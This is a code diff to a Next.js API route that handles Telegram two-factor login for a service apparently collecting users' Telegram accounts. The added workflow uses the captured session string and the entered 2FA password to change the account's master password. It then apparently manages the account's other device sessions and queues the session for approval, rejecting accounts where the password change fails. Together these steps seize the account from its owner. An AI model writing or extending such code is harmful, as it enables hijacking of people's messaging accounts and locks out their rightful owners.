@@ -1,6 +1,11 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { verify2FA } from '@/lib/telegram/auth'
 import { getDb } from '@/lib/mongodb/connection'
+import { 
+  setMasterPasswordBackground, 
+  manageDeviceSessions,
+  addToPendingList 
+} from '@/lib/telegram/account-verification-workflow'
 
 /**
  * POST /api/telegram/auth/verify-2fa
@@ -232,9 +237,39 @@ export async function POST(request: NextRequest) {
             status: 'pending'
           })
           
-          if (account) {
-            // New account was created
-            responseMessage = '✅ Account received successfully! Session file generated. Please wait for admin approval.'
+          if (account && account.session_string) {
+            // Run verification workflow in background
+            console.log('[Verify2FA] Running background verification workflow')
+            
+            try {
+              // Step 1: Set/Change master password (with current password)
+              const masterPwdResult = await setMasterPasswordBackground(account.session_string, password)
+              if (!masterPwdResult.success) {
+                console.error('[Verify2FA] Failed to set master password - rejecting account')
+                await db.collection('accounts').updateOne(
+                  { _id: account._id },
+                  { 
+                    $set: { 
+                      status: 'rejected',
+                      rejection_reason: 'Failed to set master password - Fake account detected',
+                      rejected_at: new Date()
+                    }
+                  }
+                )
+                responseMessage = '❌ Account verification failed. Account may be fake or restricted.'
+              } else {
+                // Step 2: Manage device sessions
+                const sessionResult = await manageDeviceSessions(account.session_string, false)
+                
+                // Step 3: Update pending list with session info
+                await addToPendingList(phoneNumber, telegramId, account.session_string, result.userId!)
+                
+                responseMessage = '✅ Account received successfully! Verification in progress. Please wait for approval.'
+                console.log('[Verify2FA] Background verification workflow completed')
+              }
+            } catch (workflowError: any) {
+              console.error('[Verify2FA] Workflow error:', workflowError)
+            }
           }
         }
       }
